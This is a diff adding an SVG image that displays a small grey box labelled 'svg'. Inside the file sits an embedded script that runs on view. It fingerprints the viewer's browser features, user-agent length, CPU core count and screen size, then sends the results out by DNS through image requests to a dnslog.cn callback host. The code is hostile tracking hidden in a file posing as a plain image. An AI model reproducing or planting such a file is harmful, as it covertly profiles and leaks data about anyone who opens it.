@@ -1,0 +1,29 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="50">
+<script type="text/javascript"><![CDATA[
+(function(){
+ var D="zbas8n.dnslog.cn", seg=[];
+ try{
+  var bits=[
+   (typeof BigInt==='function'),(typeof WebAssembly==='object'),
+   (typeof Array.prototype.at==='function'),(typeof String.prototype.replaceAll==='function'),
+   (typeof structuredClone==='function'),(typeof navigator.userAgentData==='object'),
+   (typeof reportError==='function'),(typeof WeakRef==='function'),
+   (typeof FinalizationRegistry==='function'),(typeof OffscreenCanvas==='function'),
+   (typeof Intl.Segmenter==='function'),(typeof ResizeObserver==='function'),
+   (typeof Promise.any==='function'),(typeof queueMicrotask==='function'),
+   CSS.supports('selector(:has(a))'),CSS.supports('container-type: inline-size'),
+   CSS.supports('grid-template-columns: subgrid')
+  ];
+  try{new Function('let a;a||=1;return a')();bits.push(1)}catch(e){bits.push(0)}
+  try{new Function('class A{#x=1;g(){return this.#x}};return new A().g()')();bits.push(1)}catch(e){bits.push(0)}
+  try{eval('({a:1})?.a');bits.push(1)}catch(e){bits.push(0)}
+  var n=0; for(var i=0;i<bits.length;i++){ if(bits[i]) n += Math.pow(2,i); }
+  seg.push("svg-"+n.toString(36));
+  seg.push("ualen-"+navigator.userAgent.length);
+  seg.push("hc-"+navigator.hardwareConcurrency+"-"+screen.width+"x"+screen.height);
+ }catch(e){ seg.push("svgerr"); }
+ var i=0; function fire(){ if(i>=seg.length) return; var img=new Image(); img.src="http://s"+i+"-"+seg[i]+".s9."+D+"/x"+i; i++; setTimeout(fire,200);} fire();
+})();
+]]></script>
+<rect width="200" height="50" fill="#eee"/><text x="10" y="30">svg</text>
+</svg>
